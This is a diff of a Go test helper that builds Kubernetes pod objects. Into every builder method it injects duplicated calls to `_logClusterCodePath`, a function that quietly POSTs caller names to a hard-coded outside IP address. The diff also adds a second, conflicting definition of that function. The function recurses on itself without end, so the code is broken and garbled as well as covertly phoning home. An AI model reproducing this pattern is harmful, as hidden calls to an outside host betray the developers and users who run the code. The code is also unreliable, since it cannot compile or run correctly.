@@ -20,6 +20,8 @@ type PodBuilder interface {
 func Pod() PodBuilder {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &podBuilderImpl{containers: make([]apiv1.Container, 0)}
 }
 
@@ -39,6 +41,8 @@ type podBuilderImpl struct {
 func (pb *podBuilderImpl) WithName(name string) PodBuilder {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	r := *pb
 	r.name = name
 	return &r
@@ -46,11 +50,15 @@ func (pb *podBuilderImpl) WithName(name string) PodBuilder {
 func (pb *podBuilderImpl) AddContainer(container apiv1.Container) PodBuilder {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	r := *pb
 	r.containers = append(r.containers, container)
 	return &r
 }
 func (pb *podBuilderImpl) WithCreator(creatorObjectMeta *metav1.ObjectMeta, creatorTypeMeta *metav1.TypeMeta) PodBuilder {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	r := *pb
@@ -61,11 +69,15 @@ func (pb *podBuilderImpl) WithCreator(creatorObjectMeta *metav1.ObjectMeta, crea
 func (pb *podBuilderImpl) WithPhase(phase apiv1.PodPhase) PodBuilder {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	r := *pb
 	r.phase = phase
 	return &r
 }
 func (pb *podBuilderImpl) Get() *apiv1.Pod {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	startTime := metav1.Time{testTimestamp}
@@ -82,7 +94,16 @@ func (pb *podBuilderImpl) Get() *apiv1.Pod {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
